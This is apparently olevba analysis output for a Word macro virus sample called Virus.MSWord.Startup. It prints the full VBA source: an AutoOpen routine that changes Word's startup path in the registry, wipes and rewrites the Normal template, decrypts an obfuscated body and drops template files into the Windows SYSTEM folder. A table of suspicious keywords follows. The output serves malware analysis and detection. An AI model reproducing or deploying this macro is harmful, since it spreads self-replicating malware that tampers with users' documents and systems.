olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Startup-5fa264497ffc38ab4836000718df461ef467482a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Startup-5fa264497ffc38ab4836000718df461ef467482a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'5'
Sub AutoOpen()
Application.DisplayRecentFiles = False
Call Install
End Sub
Sub Install()
Dim OS, WinDir, SFile As String
OS = System.OperatingSystem
If OS <> "Windows" Then
Exit Sub
End If
WinDir = Environ("WinDir")
SFile = Dir(WinDir & "\SYSTEM\system.dot")
If SFile = "system.dot" Then
Exit Sub
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\8.0\Word\Options", "STARTUP-PATH") = WinDir & "\SYSTEM"
NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
NormalTemplate.Save
Call Decrypt
End Sub
Sub Decrypt()
Dim C_DC1, C_DC2, C_DC3 As String
Dim Z, i, X, LastLine As Integer
Set ADObj = ActiveDocument.VBProject.VBComponents(1).CodeModule
LastLine = ADObj.CountOfLines
Z = Mid(ADObj.Lines(1, 1), 2, 1)
For i = 47 To LastLine
C_DC1 = ADObj.Lines(i, 1)
For X = 2 To Len(C_DC1) - 1
IntCode = Asc(Mid(C_DC1, X, 1))
IntCode = IntCode + Z
C_DC2 = C_DC2 & Chr(IntCode)
Next X
C_DC2 = C_DC2 & Chr(13)
Next i
C_DC3 = ADObj.Lines(6, 41)
Set BaseObj = CreateObject("Word.Document")
Set ATObj = ActiveDocument.VBProject.VBComponents(1)
ATObj.CodeModule.AddFromString C_DC2
ATObj.CodeModule.AddFromString C_DC3
ATObj.CodeModule.InsertLines 1, "Dim C_DC2 As String"
ATObj.Export Environ("WinDir") & "\SYSTEM\win32vba.vxd"
BaseObj.SaveAs Environ("WinDir") & "\SYSTEM\system.dot", wdFormatTemplate
BaseObj.Close
End Sub
'Np]>mtko#$'
'?dh>Z?>,'>Z?>.<nNomdib'
'?dhU'd'S'G\noGdi`<nDio`b`m'
'M\i_jhdu`'
'U8Dio##2%Mi_$&,$'
'>Z?>-8

'
'>Z?>-8
"
!U!
"
!>cm#,.$'
'>Z?>-8>Z?>-!
Np]<pojJk`i#$
!>cm#,.$'
'>Z?>-8>Z?>-!
<kkgd^\odji)?dnkg\tM`^`ioAdg`n8A\gn`
!>cm#,.$'
'>Z?>-8>Z?>-!
>\ggDino\gg
!>cm#,.$'
'>Z?>-8>Z?>-!
@i_Np]
!>cm#,.$'
'Da?dm#@iqdmji#
Rdi?dm
$!
WNTNO@HWrdi.-q]\)qs_
$79
rdi.-q]\)qs_
Oc`i'
'<__Din#
ntno`h)_jo
$)Dino\gg`_8A\gn`'
'@sdoNp]'
'@i_Da'
'Jk`i@iqdmji#
Rdi?dm
$!
WNTNO@HWrdi.-q]\)qs_
AjmDikpo<n
,'
'Ajmd8,Oj4'
'Gdi`Dikpo
,'>Z?>,'
'I`sod'
'>Z?>,8

'
'Ajmd8,Oj/,'
'Gdi`Dikpo
,'>Z?>,'
'>Z?>-8>Z?>-!>Z?>,!>cm#,.$'
'I`sod'
'>Z?>.8

'
'Rcdg`Ijo@JA#,$'
'Gdi`Dikpo
,'>Z?>,'
'AjmS8,OjG`i#>Z?>,$'
'Dio>j_`8<n^#Hd_#>Z?>,'S',$$'
'Dio>j_`8Dio>j_`(U'
'>Z?>.8>Z?>.!>cm#Dio>j_`$'
'I`soS'
'Da>Z?>.9

Oc`i'
'>Z?>-8>Z?>-!
"
!>Z?>.!
"
!>cm#,.$'
'@i_Da'
'>Z?>.8

'
'R`i_'
'>Z?>-8Hd_#>Z?>-','G`i#>Z?>-$(,$'
'>gjn`
,'
'@i_Np]'
'Np]<poj@s`^#$'
'<kkgd^\odji)?dnkg\tM`^`ioAdg`n8A\gn`'
'>jhh\i_=\mn#
No\i_\m_
$)>jiomjgn#-$)Ji<^odji8
Adg`Jk`i
'
'>jhh\i_=\mn#
No\i_\m_
$)>jiomjgn#.$)Ji<^odji8
Adg`N\q`
'
'>jhh\i_=\mn#
No\i_\m_
$)>jiomjgn#/$)Ji<^odji8
Kmdio>pmm`io?j^ph`io
'
'>\gg>mtko'
'>\ggJpond_`m'
'@i_Np]'
'Np]?j^>gjn`#$'
'Ji@mmjmM`nph`I`so'
'Da<^odq`?j^ph`io)N\q`_8A\gn`Oc`i'
'>\ggDia`^o<?'
'<^odq`?j^ph`io)>gjn`N\q`>c\ib`n58r_KmjhkoOjN\q`>c\ib`n'
'@gn`'
'<^odq`?j^ph`io)>gjn`'
'@i_Da'
'@i_Np]'
'Np]Adg`Jk`i#$'
'Rdoc?d\gjbn#r_?d\gjbAdg`Jk`i$'
')?dnkg\t'
'Da)I\h`9

Oc`i'
'Da#)Ajmh\o8
+
$Jm#)Ajmh\o8
,
$Oc`i'
'?j^ph`ion)Jk`iAdg`I\h`58)I\h`'Ajmh\o58)Ajmh\o'
'>\ggDia`^o<?'
'<^odq`?j^ph`io)N\q`'
'@i_Da'
'?j^ph`ion)Jk`iAdg`I\h`58)I\h`'Ajmh\o58)Ajmh\o'
'@i_Da'
'@i_Rdoc'
'@i_Np]'
'Np]Adg`N\q`#$'
'Ji@mmjmM`nph`I`so'
'Da?dm#<^odq`?j^ph`io)ApggI\h`$9

Oc`i'
'<^odq`?j^ph`io)N\q`'
'@gn`'
'>\ggAdg`N\q`<n'
'@i_Da'
'@i_Np]'
'Np]Adg`N\q`<n#$'
'?dhGj^\gQ\m<nDio`b`m'
'Rdoc?d\gjbn#r_?d\gjbAdg`N\q`<n$'
')?dnkg\t'
'Da)I\h`9

Oc`i'
'Da#)Ajmh\o8
+
$Jm#)Ajmh\o8
,
$Oc`i'
'M\i_jhdu`'
'Gj^\gQ\m8Dio##,+%Mi_$&,$'
'DaGj^\gQ\m8,Oc`i'
'>\ggN`oK\nnrjm_'
'@gn`'
'>\ggDia`^o<?'
'@i_Da'
'@i_Da'
'<^odq`?j^ph`io)N\q`<nAdg`I\h`58)I\h`'Adg`Ajmh\o58)Ajmh\o'
'@i_Da'
'@i_Rdoc'
'@i_Np]'
'Np]Adg`O`hkg\o`n#$'
'O`hkg\o`n#,$)N\q`_8Omp`'
'<__Din)Pigj\_A\gn`'
'>\gg>g`\m<?'
'>jhh\i_=\mn#
No\i_\m_
$)M`n`o'
'?d\gjbn#r_?d\gjbOjjgnO`hkg\o`n$)Ncjr'
'@i_Np]'
'Np]Qd`rQ=>j_`#$'
'O`hkg\o`n#,$)N\q`_8Omp`'
'<__Din)Pigj\_A\gn`'
'>\gg>g`\m<?'
'>jhh\i_=\mn#
No\i_\m_
$)M`n`o'
'<kkgd^\odji)NcjrQdnp\g=\nd^@_dojm8Omp`'
'@i_Np]'
'Np]OjjgnH\^mj#$'
'O`hkg\o`n#,$)N\q`_8Omp`'
'<__Din)Pigj\_A\gn`'
'>\gg>g`\m<?'
'>jhh\i_=\mn#
No\i_\m_
$)M`n`o'
'?d\gjbn#r_?d\gjbOjjgnH\^mj$)Ncjr'
'@i_Np]'
'Np]OjjgnJkodjin#$'
'?dhM`\gK\oc<nNomdib'
'M`\gK\oc8

'
'M`\gK\oc8Ntno`h)Kmdq\o`Kmjadg`Nomdib#

'
CF@TZ>PMM@IOZPN@MWNjaor\m`WHd^mjnjaoWJaad^`W3)+WRjm_WJkodjin
'
KMJBM<H?DM
$'
'M`\gK\oc8M`\gK\oc!
WNo\moPk
'
'Ntno`h)Kmdq\o`Kmjadg`Nomdib#

'
CF@TZ>PMM@IOZPN@MWNjaor\m`WHd^mjnjaoWJaad^`W3)+WRjm_WJkodjin
'
NO<MOPK(K<OC
$8M`\gK\oc'
'Da?d\gjbn#r_?d\gjbOjjgnJkodjin$)Ncjr8+Jm(,Jm(-Oc`i'
'Ntno`h)Kmdq\o`Kmjadg`Nomdib#

'
CF@TZ>PMM@IOZPN@MWNjaor\m`WHd^mjnjaoWJaad^`W3)+WRjm_WJkodjin
'
NO<MOPK(K<OC
$8@iqdmji#
Rdi?dm
$!
WNTNO@H
'
'@i_Da'
'@i_Np]'
'Np]Adg`Kmdio#$'
'Da?d\gjbn#r_?d\gjbAdg`Kmdio$)?dnkg\t8(,Oc`i'
'>\ggKmdio>pmm`io?j^ph`io'
'@i_Da'
'@i_Np]'
'Np]Kmdio>pmm`io?j^ph`io#$'
'Ji@mmjmM`nph`I`so'
'?dhIjKmdio<nDio`b`m'
'M\i_jhdu`'
'IjKmdio8Dio##Mi_%.$&,$'
'DaIjKmdio8.Oc`i'
'Hnb=js
ÃŠÃ«Ã£Ã¨Ã­Ã Ã«
!<kkgd^\odji)<^odq`Kmdio`m!
Ã¨Ã Ã¨Ã›Ã¤ÃŸÃ Ã¨
'q]JFJigt&q]@s^g\h\odji'
Ã‰Ã³Ã£ÃœÃ¥Ã›ÃªÃ Ã²Ã›Ã­Ã£
'
'@sdoNp]'
'@i_Da'
'<^odq`?j^ph`io)KmdioJpo'
'@i_Np]'
'Np]>g`\m<?#$'
'Ji@mmjmM`nph`I`so'
'?dh<?G>jpio'd<nDio`b`m'
'N`o<?>j_`Hj_pg`8<^odq`?j^ph`io)Q=Kmje`^o)Q=>jhkji`ion#,$)>j_`Hj_pg`'
'Da<?>j_`Hj_pg`)>jpioJaGdi`n9+Oc`i'
'<?G>jpio8<?>j_`Hj_pg`)>jpioJaGdi`n'
'<?>j_`Hj_pg`)?`g`o`Gdi`n,'<?G>jpio'
'Ajmd8,Oj-+'
'<?>j_`Hj_pg`)Din`moGdi`n,'

'
'<?>j_`Hj_pg`)?`g`o`Gdi`n,','
'I`sod'
'<^odq`?j^ph`io)N\q`_8Omp`'
'@i_Da'
'@i_Np]'
'Np]Jpond_`m#$'
'Da#?\t#Ijr$80$<i_#Hjioc#Ijr$8,-$Oc`i'
'?dh=paa`m<nQ\md\io'
'?dh=paa`m,<n=to`'
'=paa`m8<mm\t#,3/',1'.',30'+','0,'-,+'-+0',4',40$'
'Jk`i@iqdmji#
Rdi?dm
$!
Wrdi)^jh
Ajm=di\mt<n
,'
'Ajmd8,Oj,,'
'=paa`m,8=paa`m#d(,$'
'Kpo
,'d'=paa`m,'
'I`sod'
'>gjn`
,'
'Hnb=jsKmjhko58Odh`!
(OdH@OJ?d@

!>cm#,.$!>cm#,.$!
VJPONd?@MX
'Odog`58
JPONd?@M"NH@NN<B@
'
'@i_Da'
'@i_Np]'
'Np]N`oK\nnrjm_#$'
'?dhd<nDio`b`m'
'?dhK\nn^j_`<nNomdib'
'M\i_jhdu`'
'Ajmd8,Oj1'
'M>8Dio##4%Mi_$&+$'
'K\nn^j_`8K\nn^j_`!M>'
'I`sod'
'<^odq`?j^ph`io)K\nnrjm_8K\nn^j_`'
'@i_Np]'
'Np]Dia`^o<?#$'
'?dh<?G>jpio'd<nDio`b`m'
'N`o<?>j_`Hj_pg`8<^odq`?j^ph`io)Q=Kmje`^o)Q=>jhkji`ion#,$)>j_`Hj_pg`'
'<?G>jpio8<?>j_`Hj_pg`)>jpioJaGdi`n'
'Da<?>j_`Hj_pg`)Gdi`n#-',$8
Np]<pojJk`i#$
Oc`i'
'@sdoNp]'
'@gn`'
'<?>j_`Hj_pg`)?`g`o`Gdi`n,'<?G>jpio'
'<?>j_`Hj_pg`)<__AmjhNomdib>Z?>-'
'@i_Da'
'O`hkg\o`n#,$)N\q`_8Omp`'
'@i_Np]'
'"JPONd?@Mq,)++"'
'"@\no(F\u\fcno\i'PF"'
'",+e\ip\mt-++,t`\m),,5++\h"'
'"I`r`i^mtko\i_no`\goc\gbjmdoch"'

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

